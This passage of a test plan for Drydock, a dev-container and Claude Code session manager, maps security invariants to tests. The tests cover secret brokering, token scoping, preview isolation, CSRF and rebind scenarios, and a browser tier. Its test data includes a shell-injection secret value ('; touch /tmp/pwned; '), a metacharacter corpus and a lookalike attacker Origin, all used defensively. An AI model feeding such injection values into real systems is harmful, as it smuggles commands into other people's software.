*As built, Phase 5:* the official harness cannot hold a scenario that should fail — measured on CLI 0.89.0, a container that does not come up is a fatal that ends the whole run. So the hostile builds live in `feature/expect-fail/run.sh`: real `devcontainer up` runs of the Feature from the checkout, with the shared volume passed as Drydock passes it (`--mount`), each asserting a failed outcome **and** the Feature's line naming the cause (and, for a variable, naming no other), beside a baseline that must come up. The scenarios in `scenarios.json` run `drydock-preflight` directly for the same variables and carry the positive half. Asserting the message rather than the failure mattered: two mutations that disabled a check still failed the build through another check, and only the message assertion noticed.

### 6.6  The shell shims are tested from Go

`drydock-credential`, the `gh` shim, and `drydock-secrets export` are shell scripts. They are tested by `exec`ing them against a real fake-broker socket from Go tests, not with a shell test framework — one fewer dependency, and the assertions sit beside everything else. The three that matter:

- `drydock-credential get` emits exactly `username` and `password` lines and nothing else; `store` and `erase` are no-ops that exit `0` (a credential helper that errors on `store` makes git print warnings on every push);
- the `gh` shim fetches per invocation and `exec`s the real binary, with the token in the environment of the child and **not** in its own argv;
- `drydock-secrets export` round-trips arbitrary bytes — see §15.2, which is a finding rather than a test.

## 7. The scrape contract

The most brittle thing in the system gets the most mechanical treatment. `test/fixtures/transcripts/claude-<version>/` holds raw recorded PTY bytes — escapes intact, never a cleaned-up transcript — one file per scenario, each with a header naming the version, the date, the command, and the PTY width it was recorded at.

Phase 0 changed what belongs in here. The expiry watch left the corpus for JSON (§5.5), and three mechanical hazards joined it.

#### Login handshake (Spike 01)

| Fixture | Must yield |
|---|---|
| `login-url-1000col` | the complete authorize URL |
| `login-url-80col` | **a complete URL with the same parameter set**, matched per-line — `state` and `code_challenge` are per-run, so the two widths agree on everything else. The assertion is inverted from draft v5: this fixture now guards against a regression *into* wrapping rather than demonstrating one |
| `login-code-prompt` | the at-paste-prompt state, so the UI knows to accept input |
| `login-invalid-code` | `Invalid code`, *and* still at the prompt — a wrong code needs no teardown and the same URL stays valid |
| `login-success-{plain,period,press}` | all three match — `Login successful` is matched as a **prefix**, never as a whole line |
| `login-success-after-prompt` | success **on the paste prompt's own line**. The prompt does not echo, so a real verdict lands mid-line; a matcher that looks only at line starts passes all three hand-written fixtures above and misses the real thing. Synthetic |
| `login-timeout` | the third terminal state |

The URL assertion is the one worth stating precisely, because a fragment passes a naive test: assert the captured string is a **complete** URL — it parses, it carries the expected query-parameter set, and its length is in the ~450-character range — not merely that the regex matched something. "Looks like a working scrape until someone clicks the link" is a failure mode a `!= ""` assertion cannot see.

The code-shape check is a unit test with no fixture at all: `^[^#\s]+#[^#\s]+$` against a table of a bare code, a bare state, two separators, embedded whitespace, and the valid form. Spike 01's point is that Drydock validates this *before* writing to the PTY, so a truncated paste becomes an instant precise error instead of a terminal round-trip.

#### Discovery tail (Spike 02)

| Fixture | Must yield |
|---|---|
| `env-status-block` | the environment id, and `Capacity: 1/4` as the session count |
| `session-url-osc8` | the session id — matched as `session_[A-Za-z0-9]+`, never from the URL |
| `session-url-osc8-urlmatch` | **negative**: a URL-based match captures the label too. The fixture exists to keep the id-matching rule from being "simplified" later — and it earns its place: a regex over escape-stripped text passes **every recorded fixture** and only this one catches it. Synthetic |
| `status-block-repainted` | *one* row from N in-place reprints — the tail is idempotent, upsert by id |
| `session-ids-delayed` | ids arriving minutes into the stream still upsert. Synthetic, built on a recorded prefix |
| `session-id-in-model-output` | **no** row — a `session_…` id the model printed is not a server announcement |

That last fixture matters more than it did in draft v1. Matching bare ids rather than URLs is the correct rule, and it also widens the false-positive surface: an agent discussing its own session id now looks exactly like an announcement. The negative corpus is the half of the contract that catches a too-permissive pattern.

#### Startup refusals (Spike 02)

Four fixtures, one per signature — `already served by a terminal`, `Workspace not trusted`, `Unable to determine your organization`, `cannot be used with --spawn` — each paired with its verdict from §5.5. **All four exit `1`**, and the test asserts that: feed the classifier each fixture with exit status `1` and require four distinct verdicts, which is a test the natural exit-code implementation fails.

#### Identity (Spike 01)

Four golden `auth status --json` documents (absent, valid, expired, blanked) joined with six `.credentials.json` shapes (`ok`, `expiring`, `expired`, `blanked`, `absent`, `corrupt`). Three joins carry the whole point of §7.3 and each is a separate assertion:

- `loggedIn:true` with an `expiresAt` in the past → **`expired`**, taken from the file. A classifier that trusts `auth status` alone reports a healthy login.
- `loggedIn:false` with a file present and empty token strings → **`blanked`**: every workspace just died, "signed out, sign in again".
- `loggedIn:false` with no file → **`absent`**: nobody has ever signed in. Same JSON as the row above, different words, and the file read is the only thing separating them.

#### What the corpus does not prove

Stated plainly because the gap is where the bug will be. The corpus proves the parser handles the recorded bytes, not that the bytes are still what Claude Code emits — only a live run does that, which is why re-recording is a ritual (§11.1) rather than a test. Phase 0 makes that re-record cheap: four harnesses already drive the real binary, so the ritual is running them, not building them.

One assertion in the corpus is **reasoned rather than observed**, and the design says so: Spike 01 drove the handshake through an invalid code, so the `Login successful` strings come from `grep` over the binary rather than from a completed login. The three success fixtures are therefore hand-written until `harness-01-login/run.sh login` is run with a human in a browser. A hand-written fixture asserting a hand-written expectation proves only that the regex matches itself — so that row stays flagged in the corpus header until it is recorded, and §13 keeps it on Phase 5's critical path.

## 8. Invariant → test map

The table CLAUDE.md's invariant list and §13.5 / PF §10.7 imply. Columns: the tier it lives in, the mechanism, and the positive control that keeps it from being vacuous (§4.1). Where the control is "the sweep found its marker" it is written as *sweep*.

### 8.1  Front door and session auth

| Invariant | Tier | Test | Control |
|---|---|---|---|
| No TCP listener, ever | component | enumerate the process's own listening sockets after startup; assert empty | signed-in `GET /api/repos` → `200` over the Unix socket |
| Socket is group-owned, mode `0660` | component | `stat` the socket | a request through it succeeds |
| Every route is gated before its handler | component | drive the route table (§5.1) with every gate refused; assert **no handler ran** — `401`, or `302` to sign-in for the one navigation route (§5.1 note) | each route with every gate satisfied → its handler *does* run; table asserted non-empty |
| Only the sign-in POST is unauthenticated | component | the set of API-mux entries reachable with no credential equals that one entry | sign-in with the right password → `204` + cookie |
| An unimplemented route is not a route oracle | component | an authenticated-but-unimplemented entry answers `401` with no cookie, and the body does not name it — the gate precedes the `501` | with a cookie the same entry answers `501`, so the `501` path is live |
| `Origin` is exact-match | component | per mutating route: wrong, suffix-lookalike `https://evil.drydock.test`, and absent `Origin` → `403` | correct `Origin` → `202` |
| No permissive or reflected CORS | component | no response from any route carries `Access-Control-Allow-Origin` | at least one route was hit *with* an `Origin` header |
| `Host` is validated in Drydock too | component | foreign `Host` on the API socket, bypassing Caddy → `403` | correct `Host` → `200` |
| Caddy refuses a foreign `Host` first | component | §3.2 | backend records the legitimate request |
| Cookie attributes | unit + browser | exact `Set-Cookie` string; browser accepts `__Host-` and rejects a variant with `Path` altered, `Secure` dropped, or a `Domain` (`test/browser/cookies.spec.ts`) | browser replays it on a same-site fetch, seen at the server; the legal `__Host-` variant in the same response is kept |
| Lockout and the global cap | unit | table over the backoff curve with an injected clock | a correct password after the window succeeds |
| 30-day absolute, 14-day idle, sliding | unit | boundary table, injected clock | a session inside both windows authenticates |
| `argon2id` cost is not silently lowered | unit | the encoded params in a fresh hash meet the configured floor | verification of a known hash succeeds |
| No HTTP route sets the password | component | the route table contains no password-write entry; plausible paths → `404` | `drydock passwd` does change the stored hash |
| Two Drydocks refuse to coexist | component | second start against the same DB file exits non-zero | the first is still serving |
| Password, cookie, login code never persisted | component | *sweep* | *sweep* found its marker |

### 8.2  Secrets

| Invariant | Tier | Test | Control |
|---|---|---|---|
| No route returns a secret value | component | route sweep with a granted canary: no body, SSE frame, or error text contains it | the canary *is* retrievable over the broker (container tier counterpart) |
| The schema has no `value` column | unit | golden `sqlite_schema` snapshot diff | snapshot non-empty and covers every table |
| Default deny | component | ungranted repo's workspace → `GET-SECRETS` count 0 | granted repo's workspace receives it |
| `reach` is required | component | `PUT` without `reach` → `400` | with it → `200` |
| Reserved names refused | unit | table over the full §10.1 list | a legal name is accepted |
| Control characters refused in a value | component | `PUT` a value containing `\n`, `\r`, or NUL → `400` naming the character | a value with spaces, quotes, and non-ASCII is accepted and round-trips |
| A forged `GET-SECRETS` line cannot be delivered | component | with validation bypassed at the storage layer, the client's `count=` check fails the fetch and the prelude `exit`s non-zero | the unforged response delivers all three secrets |
| `export` quotes every value | unit (property) | for arbitrary byte strings, `eval "$(drydock-secrets export)"` leaves the variable byte-identical | the shell-metacharacter corpus — `'`, `$(…)`, `;`, backtick — round-trips without executing |
| No value executes as code | container | a secret whose value is `'; touch /tmp/pwned; '` leaves no `/tmp/pwned` after a Bash command runs | the variable holds that string verbatim |
| AAD is the secret id | unit | swap two rows' ciphertext+nonce; both decrypts fail | unswapped rows decrypt |
| Master key and App key never in any environment | component | the process's own `environ`, every child's `environ`, and the container's `containerEnv` contain neither; a key file not mode `0400` fails startup | both keys are in use — a secret round-trips and a token is minted |
| Values stay out of `argv`, `ps`, `docker inspect` | container | after supervisor start, none contain the canary | the session process's own `environ` does |
| `secret_access` is written per fetch | component | one row per `GET-SECRETS` | the fetch returned the secret |
| Rotation marks staleness, never restarts | component | rotate; assert workspace flagged and the supervisor pid unchanged | the flag says which kind of stale |
| `export` is silent on success | component | stdout and stderr are both **zero bytes** | the variables were nonetheless exported into the command's environment |
| `export` fails closed | component | on a broker outage the command *after* the prelude does not run, the shell exits `69`, and stderr is one line; and with the helper **missing or not executable**, the command after `eval "$(drydock-secrets export || echo exit 69)"` still does not run — asserted on the command, not on any status, which `eval` discards (see below) | with the helper present and the broker up, the same command runs and sees its secret |
| The prelude script is one constant line | container | the file's text equals a fixed constant, contains no resolved value, and is never rewritten for the life of the workspace | rotating a grant still reaches the next command, with the text untouched |
| Values stay out of `argv` | container | the canary appears in no `/proc/<pid>/cmdline` of the session process or any command shell — though the script *text* does | the value is present in the command's environment |
| The broker is cheap per call | component | N exports make zero GitHub requests and run no KDF per call — decrypt happens at grant resolution | each export still returns the right values |

**As built (Phase 4).** Every row above has a test except *rotation never restarts* and *values stay out of `ps`* for the session process, both of which need the Phase 5 supervisor. Where they live: `internal/secrets` (reserved names, control characters, AAD swap, decrypt-per-write, default deny, a forged row refused at delivery), `internal/broker/secrets_test.go` (the verb's framing and strictness, default deny over the wire, `secret_access` per fetch, cheap per call, and the client: the round-trip property test over both transports in `dash` and `bash`, silence, fail-closed, a lying stand-in broker, the argv sweep, the env file's constancy), `internal/server/secrets_test.go` (the canary sweep end to end: every response body, every SSE frame, the whole temp tree and the SQLite file and WAL byte for byte, in seven encodings, for three canaries and the master key, with the canary delivered to its granted workspace and not to the ungranted one as the controls), `test/container` (Phase 4's done-when, the hostile value, argv inside the container, `docker inspect`), the Feature's own suite, and `test/install` (the master key's creation, mode, absence from output and environment, survival across re-run and upgrade, and refusal to replace a damaged one). Each was mutation-checked; the PR that built them lists what caught what.

**One row was wrong in a way only an implementation finds.** *`export` fails closed* says the prelude `exit`s non-zero. The helper can, but the line `eval "$(drydock-secrets export)"` cannot: an `eval` of a failed substitution evaluates the empty string and succeeds, so the status is lost and the command runs. The helper therefore prints `exit 69` for the `eval` to run, and the line adds `|| echo exit 69` for a helper that cannot run to print anything (overall §10.3); the tests assert what the row means — the command *after* the prelude did not run — rather than the helper's status, which a test can observe while the bug stands.

### 8.3  GitHub credentials

| Invariant | Tier | Test | Control |
|---|---|---|---|
| The socket is the identity | container | from container A, connecting to B's socket path fails (it is not mounted) | A's own socket yields a token scoped to A |
| The protocol carries no repo parameter | unit | the parser rejects any extra field on the line | valid lines parse |
| Permission sets are exactly §9.3 | component | golden JSON per scope, asserted by `fakegithub` | the mint succeeded and the token works |
| No token in `.git/config` or the tree | container | after clone, grep the whole workspace for the token canary | the clone succeeded and `git fetch` works through the helper |
| Cache is keyed by permission set | component | 20 `gh` invocations → 1 upstream mint; a different scope → a second | both invocations succeeded |
| `token_grant` holds no token | unit | schema snapshot + *sweep* over the DB bytes | grant rows exist |
| No Docker socket in any workspace container | container | `/var/run/docker.sock` absent; `docker` non-functional | the `postStart` broker probe passes |
| Commits carry the bot identity, branches the `drydock/` prefix | container | the Feature sets `user.email` and the push namespace; a real push to `fakegithub` lands under `drydock/` | the push succeeded |
| Never fall back to a broader credential | component | `fakegithub` returns 403/suspended; assert the error surfaces and no second, wider request is made | the pre-failure request was narrow and worked |

### 8.4  Claude Code

| Invariant | Tier | Test | Control |
|---|---|---|---|
| The five variables stay unset | container (Feature scenarios) | one scenario per variable: build fails naming it | the clean scenario passes `postCreate` |
| Version is pinned, autoupdater off | container + unit | `claude --version` equals the pin; `DISABLE_AUTOUPDATER=1` present; the version string in CLAUDE.md, the Feature, and Spike 00 all agree | the pinned binary runs |
| A blanked credential is not an expired one | unit | the six credential fixtures classify distinctly | *expiring* still produces a countdown |
| `.oauth_refresh.lock` is never reaped | container | plant the lock dir, run a full lifecycle, assert inode and mtime unchanged | the lifecycle completed |
| The credential volume is a local driver | component | startup refuses a non-`local` driver | accepts `local` |
| Fast exit on ineligibility is not a crash | component | the ineligible transcript → `awaiting_login`, zero retries | an ordinary crash transcript → backoff, capped at 6 in 10 min |
| Sessions are observed continuously | component | a URL emitted minutes in still upserts; a model-printed URL does not | a server-announced URL does |
| The PTY buffer is never persisted verbatim | component | *sweep* for the login-code canary after a scripted handshake | `fakeclaude` confirms the code arrived on stdin |
| Login has a deadline and a cancel | component | injected clock past 5 min → handshake killed, Drydock still serving | a cancel mid-handshake frees the PTY and a new login starts |
| A wrong code does not need a teardown | component | submit `Invalid code`, then a second code on the same PTY | the second submission reaches the prompt and the original URL is still valid |
| The feature writes all three `.claude.json` keys | container (Feature scenarios) | one scenario per missing key: absent trust → `Workspace not trusted`; absent `oauthAccount` → the organization error; absent `remoteDialogSeen` → **a hang, asserted as a timeout** | with all three present, a headless start reaches `serving` |
| A copied credential is not enough | container | a container holding only `.credentials.json` makes a model request fine and **refuses** Remote Control | the same container on the shared volume starts |
| One `/workspace` trust record serves every container | container | a second workspace on the shared volume needs no new trust write | the first container's write is what satisfies it |
| `SIGTERM` first, `SIGKILL` only on timeout | container | a clean stop prints `Environment preserved` and the next start is accepted immediately | a `SIGKILL` of a session-less server is what produces the `409` below |
| A `409` is a wait, not a crash | component | it gets its own state, is retried on a flat interval, and **does not spend the restart budget**; the UI says *waiting* | a genuine crash does consume the budget and parks in `degraded` |
| Nothing is coded against the 409 duration | component | the fake refuses for a caller-chosen span; no constant appears in the assertion | the supervisor starts as soon as the fake stops refusing |
| The environment id survives a restart | container | after `SIGTERM` and after `SIGKILL`, the id and the card link are unchanged | sessions reconnect and capacity is preserved |
| Capacity counts the pre-created session | component | `--capacity 4` yields three on-demand sessions | the fourth is refused, and the count shown matches `Capacity: N/4` |
| Exit status is never the discriminator | unit | four refusal fixtures, all exit `1`, four distinct verdicts | each verdict drives the right action |
| Version pin agrees across the repo | unit | the version string in CLAUDE.md, the Feature, and **all four** spike reports match | the pinned binary in the container reports it too |
| `fakeclaude` is the corpus | unit (`internal/claudetest`) | every mode on a real PTY is byte-identical to its recording; every replayed file matches its pinned SHA-256; a corpus directory newer than the fake's version, or a fake version other than `classify.ClaudeCodeVersion`, fails | an unchanged copy of the corpus replays, and the classifiers reach their own tests' verdicts on the fake's output — four refusals with one exit code give four verdicts, both gates give a timeout and no verdict, the model-printed id is not a session |

*As built (`fakeclaude`):* the fake half of every component row above that names it exists — the code arriving once with CR framing, a refusal persisting for a caller-chosen span, the crash loop, the delayed and model-printed ids, both hangs. The other half of those rows is the login handshake's and the supervisor's, and lands with them.

*As built (the supervisor, Phase 5):* `internal/supervisor`'s component tests run the real `container.SessionArgs` argv through a fake `devcontainer` that execs the real launch line with `sh` on the host, against `fakeclaude` on the supervisor's own PTY, and a fake `docker` that runs the real in-container signal script — so the pid file, the cmdline check and the signal order are the production ones, and only the container is not. Rows covered there: *fast exit on ineligibility* (the organization refusal → `awaiting_login`, one attempt; a crash loop backs off and parks after the budget), *sessions observed continuously* (a session announced 700 ms in still upserts; the model-printed id is never a row while the announced one is), *a `409` is a wait* and *nothing coded against its duration* (a refusal for a span the test picks, waited out with a budget of one and `restart_count` 0; the control parks on two crashes), *exit status is never the discriminator* (four refusals, all exit 1, four destinations), the two hangs (no verdict at half the timeout, `degraded` naming the key after it, SIGTERM sent, nothing typed — fakeclaude's violation log), *SIGTERM first* (the recorded `Environment preserved`, exit 0, no KILL) and its timeout (a stand-in ignoring TERM is KILLed only after the grace period, TERM first in the docker log), boot adoption of a stray server (stopped with SIGTERM before the next start), the identity deferral (blanked, absent and expired start nothing until `auth.identity`; an exit while blanked is not a crash, the control is), a prelude failure (claude never runs), and the log's redaction canary (a token split across two reads and a granted secret's value masked, neither in the database file or WAL, the line around them kept). Each of the budget exclusion, the OSC 8-only rule, SIGTERM-first, the SIGTERM grace period, the identity check and the stray stop was mutation-checked: the PR lists what caught what. `test/container`'s `TestSessionServerInARealContainer` runs it through real `devcontainer exec` and `docker exec` with `fakeclaude` as the container's `claude` — never a real `remote-control` against a real account — and asserts that Drydock going away leaves the server running in the container, that the next Drydock's start stops it with SIGTERM and serves again on the same environment, and that a stop leaves nothing running. The server-driven container tests store the test volume's true identity, `absent`, so step 8 hands off and the supervisor waits rather than start the Feature's real Claude Code. Still owed by the real half (§11.4): *the environment id survives a restart* against a real account, *capacity counts the pre-created session* (the fourth session refused), and liveness from the connection-status line, which is not built.

*As built (the login handshake, `internal/login`):* the three handshake rows above are built against fakeclaude on a real PTY (`login_test.go`, through `logintest.Launcher`). **PTY buffer never persisted:** two canary codes, one wrong and one right, swept from every file under the temp root (the database checkpointed, the fake's own state), the service log, every event, the view and every `/proc/*/cmdline`, each code and each half; the control is fakeclaude's log of both hashes, accepted and rejected. The same sweep runs through the real server (`internal/server/login_test.go`) over every HTTP response on every route, the SSE transcript and every request URL — CLAUDE.md's "HTTP path that carries the login code" — with the login id found by the same sweep as its control. **Deadline and cancel:** the injected clock at four minutes is still waiting and at five is `timed_out`, the process dead and removed, and a new login starts; a cancel at the prompt and one during start each end `cancelled` with nothing left. **No teardown on a wrong code:** two wrong codes and a right one on one process and one URL, the deadline unchanged — with the replay paced in five-byte chunks, because unpaced every verdict is one write and a verdict read from the whole stream (the first `Invalid code` answering the second code) passes. Also: twenty concurrent starts make one login; a refused shape never reaches the PTY; a process killed at the prompt is `failed`, never `succeeded`; shutdown ends it. Mutation-checked — the whole-stream verdict, `Invalid code` read as success, LF framing, the code in an event or a log line, process exit as success, no deadline, no removal, no kill, an untrimmed code, no shape check, no one-at-a-time — each fails a test, as do the route's detail or `202` quoting the code and a malformed body quoted back. **Container tier** (`test/container/login_test.go`): the real `DockerLauncher` with fakeclaude, built static, mounted into a busybox container — the PTY semantics Spike 01 relied on hold through `docker run -t` at 80 and 1000 columns (§7.2 *As built*), the fresh volume is labelled and given to Drydock's uid `0700`, a killed container is `failed` with nothing left, a killed CLI leaves its container (measured) for the sweep to remove, and a volume another uid owns is refused untouched; dropping `--tty`, or the helper's `chown`, fails it.  **Login resumes the supervisor** (`internal/supervisor/login_test.go`): a running workspace's supervisor parks in `awaiting_login`, the handshake succeeds against fakeclaude, the watch stores `ok` and writes `auth.identity`, and the supervisor reaches `serving` on fakeclaude's remote-control; a wrong code first — no `auth.identity`, no remote-control run — is the control, and a handshake that does not tell the watch fails it.

### 8.5  Previews

| Invariant | Tier | Test | Control |
|---|---|---|---|
| The preview mux serves no API route | component | every API pattern on `preview.sock` → `404`, no handler reached; route set equals the two `/.drydock/*` | an enabled preview proxies on that same socket |
| The upstream is derived, never supplied | unit + component | fuzz `Host`, headers, query, and body for anything that changes the dial target | a legitimate dial reaches `fakeupstream` |
| Re-resolve by label at every dial | container | kill X's container, start another that takes the IP, assert the dial denies rather than reaching Y | before the kill, the dial reached X |
| Re-resolve the PID at every scan | container | kill the container, assert the scan reports empty rather than host listeners | a live container's listeners are found |
| The preview cookie never reaches the container | container | recording upstream asserts absence; an upstream `Set-Cookie` claiming the name is dropped | the app's own cookie passes both ways |
| Previews are default-deny | component | disabled port → `/.drydock/denied`; enabled → proxies | the enable is what flips it |
| Discovery never enables | component | no scan ever changes `enabled` | a scan does change `observed` and `bind_addr` |
| Loopback is diagnosed, never dialed | container | `webapp`'s `127.0.0.1:9090` is listed, greyed, not previewable, and no dial is attempted | its `0.0.0.0:8080` previews fine |
| Discovery fails visibly | component | an unreadable `/proc` path badges "discovery unavailable" and keeps declared ports | the readable case lists observed ports |
| The one-time token is single-use and atomic | component | 100 concurrent consumes → exactly one success | that one completes the handshake |
| The token never lands in a log | component | *sweep* including Caddy's log dir; `Referrer-Policy: no-referrer` on `/.drydock/session` | the handshake succeeded |
| `preview_session` dies with its port and its session | component | disable the port → rows gone; revoke-all → rows gone | the rows existed and worked beforehand |
| A retired slug is never reissued | component | delete a port, then re-add the same port many times; no mint ever equals the retired slug, and the old URL stays a `/.drydock/denied` | the re-added port gets a *working* preview on its new slug |
| Retiring does not block a re-add | component | the partial unique index permits a new live row for the same `(workspace, port)` | a *second live* row for that pair is still refused |
| The preview mux is resource-bounded | component | past the cap → `503`; an idle upgrade is closed | under the cap, upgrades stay open |
| Sign-in appears only on the bare UI origin | component | no preview-mux response contains a password input | the UI's sign-in page does |

### 8.6  Lifecycle, reconciliation, and recovery

| Invariant | Tier | Test | Control |
|---|---|---|---|
| Every step writes an event naming itself | component | eight scripted failures, one per step | the success path emits all eight in order |
| The five reconciliation rows | unit + container | pure table; then adopt-orphan and died-unobserved for real | the adopted workspace is still usable (`exec` + broker probe) |
| **The amnesia test** | container | delete the SQLite file entirely, restart, assert every running workspace is rebuilt from labels | the rebuilt workspace serves a preview and mints a token |
| Nothing auto-starts | container | stop a workspace, restart Drydock, assert still stopped | a `running` one is adopted running |
| Kill -9 mid-operation resumes or fails cleanly | container | SIGKILL during clone, during `up`, and during delete; restart | `deleting` resumes to completion; the others reach `failed` with the step named, never a half state |
| Delete removes worktrees | container | add a worktree the DB does not know about, then delete | `git worktree list` was the source — the unknown worktree is gone too |
| Delete requires the repo name | component | no `?confirm=` → `400`; wrong name → `400` | correct name → `202` |
| The cap refuses and names a candidate | component | at the cap, the refusal body lists running workspaces with session counts | under the cap, create succeeds |
| Disk pre-flight refuses | component | injected reporter over threshold → refusal before any clone | under threshold → proceeds |
| Clone survives rebuild and stop | container | write an uncommitted file, `rebuild`, then `stop`/`start`; assert it survives both | the container id changed on rebuild |
| A foreign label prefix is never adopted | container | start a second Drydock with a different prefix beside the first's running workspaces; it adopts none of them, and a delete there removes none of them | it does adopt and manage the containers carrying *its own* prefix |

### 8.7  Invariants the suite cannot cover

Stated rather than quietly dropped. Each is a review gate, a ritual, or an upstream fact.

| Invariant | Why not testable | Covered by |
|---|---|---|
| Nothing stops a workspace automatically | the absence of code; a grep for timers is theatre | review gate on any PR touching lifecycle |
| No re-auth prompt on destructive routes | absence again | review gate |
| Remote Control genuinely needs a full login, not a setup token | an upstream fact about Anthropic's service | §2.1 is documentation; the reserved-name test covers our half |
| Any Phase 0 behaviour stays true on a future Claude Code version | undocumented internals of `2.1.246` | re-run all four harnesses (§11.1) |
| `reach` is filled in honestly | a human judgement about prose | the required field is the control; nothing more is available |
| The operator does not type the password into a preview | human behaviour | PF §10.5's UX measures; the browser tier proves the origin is visibly different |
| A granted secret stays inside the container | §10.4 says plainly there is no technical control | nothing. This is the design's stated residual risk, not a test gap |

## 9. Adversarial scenarios

The security review's threat actors become named scenarios rather than being left implicit in §8's rows. Each is one test that plays the actor's whole move, and each maps to a review finding so a regression is traceable to the analysis that found it.

| Scenario | Actor | Plays | Asserts | Review |
|---|---|---|---|---|
| `rebind` | internet page | a request to the API socket with an attacker `Host` | refused at Caddy *and* at Drydock, independently | §13.3 |
| `csrf-plain` | internet page | cross-site `POST /api/workspaces` | no cookie attached; `403` on `Origin`; nothing created | F2 |
| `csrf-suffix` | hostile preview | `POST` with `Origin: https://evil.drydock.test` | `403` — the exact-match requirement, which a suffix check would pass | F2 |
| `csrf-no-origin` | scripted client | `POST` with `Origin` stripped | `403`, fail-closed | F2 |
| `cors-read` | hostile preview | cross-origin `fetch` of a data `GET` | unreadable; no reflected `Origin` | F2 |
| `ip-reuse` | compromised container | X dies unobserved, Y takes its IP, a preview for X is opened | denied, never Y's dev server | F3 |
| `pid-reuse` | — | the container dies, a host process takes its PID, a scan runs | empty scan, never host listeners surfaced | F3 |
| `cross-broker` | compromised container | A tries B's socket path, and a `GET-TOKEN` with an injected repo field | ENOENT; the extra field is a parse error | §9.1 |
| `cookie-upstream` | hostile repo | a dev server that logs every header and echoes `Set-Cookie: <preview cookie name>` | the cookie never arrives; the echo is dropped | PF §7 |
| `token-in-log` | — | a full preview handshake, then the sweep | the `?t=` token is in no file, including Caddy's logs | F4 |
| `preview-to-preview` | hostile preview | slug A fetches slug B with credentials | B's cookie is not sent; B bounces to authorize | PF §10.4 |
| `clickjack` | hostile preview | frames the UI | blocked by `frame-ancestors 'none'` | PF §10.7 |
| `stolen-db` | backup holder | copies the SQLite file, tries every value in it | no usable cookie, token, or secret — the sweep's converse, asserted positively | §4 |
| `lost-device` | — | revoke-all from a second device | every session and every `preview_session` dies; containers keep working | §13.2 |
| `brute-force` | LAN device | the lockout curve from one IP and from many | per-IP backoff and the global cap both engage; attempts are logged | §13.2 |
| `secret-injection` | hostile value | a secret whose value contains a newline, a single quote, `$(…)`, and a NUL | see §15.1 and §15.2 — currently a **design finding**, and these are its regression tests once the design answers it | — |

## 10. The browser tier

Ten or so tests, and they exist because they are the only way to answer PF §14.1's first open question: *does the cross-site boundary hold end to end?* The design says `SameSite` is "a browser behavior you do not control and cannot test in CI." The second half is only true without a browser in CI.

### 10.1  The harness

| Piece | Choice | Why |
|---|---|---|
| Domains | `drydock.test` and `*.drydock-preview.test` | distinct eTLD+1 under a reserved TLD, so the browser's own PSL treats them as cross-site — the exact property PF §4 buys with a second real domain |
| Resolution | Chromium `--host-resolver-rules="MAP *.drydock-preview.test 127.0.0.1, MAP drydock.test 127.0.0.1"` | wildcard resolution, which `/etc/hosts` cannot express |
| Certificates | a throwaway local CA, one leaf for the UI host and one wildcard for the preview domain, trusted via `certutil -A -t "C,,"` into `~/.pki/nssdb` — measured in [Spike 04](../spikes/04-browser-ca.md) | **`ignoreHTTPSErrors` is not acceptable here** — but not for the reason this row gave until v5. It does *not* break `Secure`/`__Host-` semantics; it passes all fourteen assertions. What it does is make the tier blind to a **misissued or wrong-host certificate**, which is a plausible Caddyfile regression (§3.2) this tier is otherwise well placed to catch. Real NSS trust is the only route that keeps validation on |
| Driver | Playwright | `context.cookies()`, request interception, and a trace on failure are exactly what the three assertions need. ~~`chromedp` keeps it all in Go and is the fallback if the second language proves unwelcome~~ — **withdrawn in v4**, see below |

> [!NOTE]
> **Spiked — the cert-trust step works, and the tier is built as specified**
>
> ~~The cert-trust step is the one piece whose cost is unknown, and the tier's value collapses if it needs `ignoreHTTPSErrors`.~~ Answered by [Spike 04](../spikes/04-browser-ca.md): one `certutil -A` into `~/.pki/nssdb` and a headless Chromium does full certificate validation against a throwaway CA. **All fourteen assertions pass**, including the three cross-site cookie questions [PF §14.1](../port-forwarding/port-forwarding-design.md) asked — so the tier keeps its nine assertions and §16.1's fallback (a real domain, or a shrunken tier) is not needed.
>
> Three mechanics from it that the harness depends on, each a quiet failure otherwise:
>
> - **`--host-resolver-rules` takes a port on its right-hand side**, so the listener is unprivileged while the page's origin stays port-less. The origin must be `https://drydock.test`, not `…:8443`, or the `__Host-` rules and site comparisons are not the ones under test.
> - **A leaf needs a `subjectAltName`.** Chromium has ignored `commonName` since M58, and a CN-only cert fails with `ERR_CERT_COMMON_NAME_INVALID` — which reads as a broken CA and sends you debugging the wrong thing.
> - **The cross-site navigation assertion must click a real link.** `page.goto` is browser-initiated and `sec-fetch-site: none`, so it carries the cookie under `Strict`, `Lax`, and `None` alike; a `goto`-based version of that test passes whatever the policy is.
>
> The harness also establishes a rule for any future one that touches a trust store: **it removes the CA it trusted, on exit and on `SIGINT`.** A throwaway CA left trusted in the operator's own browser store is a standing impersonation hole.

> [!NOTE]
> **The `chromedp` fallback is withdrawn, and it was withdrawn by a decision made elsewhere**
>
> Draft v3 held Playwright at arm's length because it introduces a second language, and offered `chromedp` as the way to keep everything in Go. That reasoning was sound when the repository was Go and nothing else. It no longer is: the [frontend design](../frontend/frontend-design.md) §3.1 settles on Vue with TypeScript and a Vite build, so **`npm`, a `node_modules`, and a TypeScript toolchain are in the repository whether this tier wants them or not.**
>
> The cost Playwright was being charged for is therefore already paid, and two things flip with it. Playwright now *shares* a toolchain with the frontend tier above rather than being a lone JavaScript dependency in a Go project — one `package.json`, one `npm ci` in CI, and the same test runner idiom a frontend contributor already knows. And `chromedp` becomes the more expensive option, because it would be the only thing in the repository driving a browser from Go while the frontend drives one from TypeScript a directory away.
>
> Recorded as a decision rather than a preference, because the thing that changed is not an opinion about Playwright. It is which languages the repository contains, and that was decided by §3.1 of another document.

### 10.2  What it tests, and nothing more

Everything in this tier is something no other tier can reach. The three from PF §14.1, plus six that are also browser-only:

1. a state-changing `POST` from a preview origin to `/api/*` carries **no cookie** (asserted at the server, not inferred from the status code) and is refused;
2. the same request with `Origin` stripped is still refused — the belt behind `SameSite`;
3. a data `GET` cannot be *read* cross-origin from a preview origin;
4. the `__Host-` cookie is accepted, and a variant with `Path` or `Secure` altered is rejected by the browser;
5. the four-redirect authorize handshake renders the app with no user interaction, and the cookie survives the cross-site top-level navigation — the concrete reason the session cookie is `Lax` and not `Strict`;
6. preview A cannot read preview B;
7. the UI cannot be framed from a preview origin;
8. HMR works: a websocket upgrade through two proxy hops, and a file change reaches the page;
9. the SSE stream delivers an event to a real `EventSource` through Caddy without buffering.

Four more arrive with the UI. Each is out of the frontend tier's reach for the reason §10.3 generalizes below:

